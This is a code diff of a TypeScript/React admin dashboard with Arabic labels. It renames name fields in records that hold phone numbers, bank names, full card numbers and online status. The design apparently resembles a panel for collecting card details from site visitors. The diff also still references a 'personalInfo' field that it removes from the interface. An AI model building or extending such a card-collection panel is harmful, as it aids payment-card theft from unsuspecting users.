@@ -47,14 +47,14 @@ interface Notification {
   createdDate: string
   phone?: string
   notificationCount: number  
-    fullName?: string
+    name?: string
 
   isOnline?: boolean
   country?: string
-  personalInfo?: {
-    id: string
-    fullName: string
+  customer?: {
+    name: string
     phone: string
+    email:string
   }
   bank: string
   cardNumber: string
@@ -259,9 +259,9 @@ function UserStatus({ userId }: { userId: string }) {
                     <td className="px-4 py-3">
                       <div className="flex items-center gap-2">
                         <div className="w-8 h-8 bg-blue-500 rounded-full flex items-center justify-center text-sm font-medium">
-                          {notification?.fullName?.charAt(0) || "N"}
+                          {notification?.name?.charAt(0) || "N"}
                         </div>
-                        <span className="font-medium">{notification?.fullName || "غير محدد"}</span>
+                        <span className="font-medium">{notification?.name || "غير محدد"}</span>
                       </div>
                     </td>
                     <td className="px-4 py-3">
@@ -284,11 +284,11 @@ function UserStatus({ userId }: { userId: string }) {
                     <td className="px-4 py-3">
                       <div className="flex flex-col sm:flex-row gap-2">
                         <Badge
-                          variant={notification?.fullName ? "default" : "destructive"}
+                          variant={notification?.name ? "default" : "destructive"}
                           className="rounded-md cursor-pointer hover:opacity-80 transition-opacity"
                           onClick={() => handleInfoClick(notification, "personal")}
                         >
-                          {notification?.fullName ? "معلومات شخصية" : "لا يوجد معلومات"}
+                          {notification?.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                         </Badge>
                         <Badge
                           variant={notification.cardNumber ? "default" : "destructive"}
@@ -345,10 +345,10 @@ function UserStatus({ userId }: { userId: string }) {
             <div className="space-y-4">
               <div className="flex items-center gap-3 p-3 bg-gray-700 rounded-lg">
                 <div className="w-12 h-12 bg-blue-500 rounded-full flex items-center justify-center text-lg font-bold">
-                  {selectedNotification.personalInfo.fullName?.charAt(0) || "N"}
+                  {selectedNotification.personalInfo.name?.charAt(0) || "N"}
                 </div>
                 <div>
-                  <h3 className="font-semibold text-lg">{selectedNotification.personalInfo.fullName}</h3>
+                  <h3 className="font-semibold text-lg">{selectedNotification.personalInfo.name}</h3>
                   <p className="text-gray-400 text-sm">معلومات المستخدم</p>
                 </div>
               </div>
@@ -356,7 +356,7 @@ function UserStatus({ userId }: { userId: string }) {
               <div className="space-y-3">
                 <div className="flex justify-between items-center p-2 bg-gray-700/50 rounded">
                   <span className="text-gray-300">الاسم الكامل:</span>
-                  <span className="font-medium">{selectedNotification?.fullName}</span>
+                  <span className="font-medium">{selectedNotification?.name}</span>
                 </div>
                 <div className="flex justify-between items-center p-2 bg-gray-700/50 rounded">
                   <span className="text-gray-300">رقم الهاتف:</span>
